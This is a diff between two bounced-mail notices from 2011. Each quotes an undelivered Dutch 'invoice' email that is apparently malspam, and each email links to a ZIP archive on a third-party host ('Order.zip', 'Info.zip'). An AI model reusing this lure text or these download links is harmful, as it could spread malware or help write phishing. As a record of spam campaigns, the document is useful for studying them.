@@ -1,7 +1,7 @@
-From: Mail Delivery System <Mailer-Daemon-95N5ItBNkBPqAUHrpADhqmZy7eGcjJgl@public.gmane.org>
+From: Mail Delivery System <Mailer-Daemon-yUpc+wzIOoTRPlbv2KtqYlR5wHoBV41A@public.gmane.org>
 Subject: Mail delivery failed: returning message to sender
-Date: Tue, 15 Nov 2011 18:44:03 +0000
-Message-ID: <E1RQNzH-0004oG-LQ@mail5.atlas.pipex.net>
+Date: Tue, 15 Nov 2011 21:12:04 +0100
+Message-ID: <E1RQPMS-0004Bp-VM@www14.totaalholding.nl>
 Mime-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
@@ -23,56 +23,45 @@ This message was created automatically by mail delivery software.
 A message that you sent could not be delivered to one or more of its
 recipients. This is a permanent error. The following address(es) failed:
 
-  wjbz-B0qZmFHriGg@public.gmane.org
-    SMTP error from remote mail server after RCPT TO:<wjbz-B0qZmFHriGg@public.gmane.org>:
-    host smtp3.dds.nl [85.17.178.153]: 550 5.1.1 <wjbz-B0qZmFHriGg@public.gmane.org>:
-    Recipient address rejected: User unknown in local recipient table
-  wjblack-B0qZmFHriGg@public.gmane.org
-    SMTP error from remote mail server after RCPT TO:<wjblack-B0qZmFHriGg@public.gmane.org>:
-    host smtp3.dds.nl [85.17.178.153]: 550 5.1.1 <wjblack-B0qZmFHriGg@public.gmane.org>:
-    Recipient address rejected: User unknown in local recipient table
-  wjb-B0qZmFHriGg@public.gmane.org
-    SMTP error from remote mail server after RCPT TO:<wjb-B0qZmFHriGg@public.gmane.org>:
-    host smtp3.dds.nl [85.17.178.153]: 550 5.1.1 <wjb-B0qZmFHriGg@public.gmane.org>:
-    Recipient address rejected: User unknown in local recipient table
-  wja-veen-B0qZmFHriGg@public.gmane.org
-    SMTP error from remote mail server after RCPT TO:<wja-veen-B0qZmFHriGg@public.gmane.org>:
-    host smtp3.dds.nl [85.17.178.153]: 550 5.1.1 <wja-veen-B0qZmFHriGg@public.gmane.org>:
-    Recipient address rejected: User unknown in local recipient table
+  justinhartman-39ZsbGIQGT7z+pZb47iToQ@public.gmane.org
+    (ultimately generated from thebrahmabull-XWDq0cian7ebzO23DN1VhA@public.gmane.org)
+    SMTP error from remote mail server after RCPT TO:<justinhartman-39ZsbGIQGT7z+pZb47iToQ@public.gmane.org>:
+    host smtp-in.wanadoo.nl [194.134.42.41]: 550 5.1.1 <justinhartman-39ZsbGIQGT7z+pZb47iToQ@public.gmane.org>:
+    Recipient address rejected: User unknown in virtual mailbox table
 
 ------ This is a copy of the message, including all the headers. ------
 
 Return-path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Received: from static.99.74.4.46.clients.your-server.de ([46.4.74.99] helo=myoroclean.domain.de)
-	by mail5.atlas.pipex.net with esmtpa (Exim 4.71)
+Received: from mail by www14.totaalholding.nl with spam-scanned (Exim 4.76)
 	(envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
-	id 1RQNym-0004ME-HM; Tue, 15 Nov 2011 18:43:32 +0000
-Received: from [46.4.74.99] by myoroclean.domain.de id 7x5eZcQKy17i with SMTP; Tue, 15 Nov 2011 19:54:14 +0100
-Date: Tue, 15 Nov 2011 19:54:14 +0100
+	id 1RQPML-0004AP-IP; Tue, 15 Nov 2011 21:12:01 +0100
+X-Spam-Checker-Version: SpamAssassin 3.3.1 (2010-03-16) on
+	www14.totaalholding.nl
+X-Spam-Level: **
+X-Spam-Status: No, score=2.9 required=5.0 tests=RCVD_IN_BRBL_LASTEXT,
+	RCVD_IN_RP_RNBL,TVD_SPACE_RATIO autolearn=no version=3.3.1
+Received: from static.99.74.4.46.clients.your-server.de ([46.4.74.99] helo=myoroclean.domain.de)
+	by www14.totaalholding.nl with esmtp (Exim 4.76)
+	(envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
+	id 1RQPML-0004AJ-FI; Tue, 15 Nov 2011 21:11:57 +0100
+Received: from [46.4.74.99] by myoroclean.domain.de id yCCTm7RNuhIj with SMTP; Tue, 15 Nov 2011 21:22:40 +0100
+Date: Tue, 15 Nov 2011 21:22:40 +0100
 From: "Billing" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-X-Mailer: The Bat! (v3.7.27.2) Home
+X-Mailer: The Bat! (v4.6.60.6) Personal
 X-Priority: 3 (Normal)
-Message-ID: <099630088.35526282612629-lsYetlmOafdBoFUHns3esWfrygkm6VTR@public.gmane.org>
-To: <wjansen-B0qZmFHriGg@public.gmane.org>
-Subject: Factuur 017257-446544
+Message-ID: <071092409.36058529968696-lsYetlmOafdBoFUHns3esWfrygkm6VTR@public.gmane.org>
+To: <admin-XWDq0cian7ebzO23DN1VhA@public.gmane.org>
+Subject: Factuur - 207848-696836.
 MIME-Version: 1.0
 Content-Type: text/plain;
 	charset="windows-1252"
 Content-Transfer-Encoding: 8bit
-X-Mailcore-Auth: 6699156
-X-Mailcore-Domain: 609085
 
 
 
 
-Goedendag, wjansen.
-
+Dear customer,
 
 Sorry voor de vertraging.
-Werk uw accountgegevens.
-http://merlin.iglu.cz/clientedown/Order.zip?id:94066893Generation_user=wjansen-B0qZmFHriGg@public.gmane.org
-
-
-==
-Best regards,
-Tel./Fax.: +31 (20) 021 72 54.
+Beloofd om informatie te verzenden:
+http://myweb.hypercenter.gr/clientedown/Info.zip
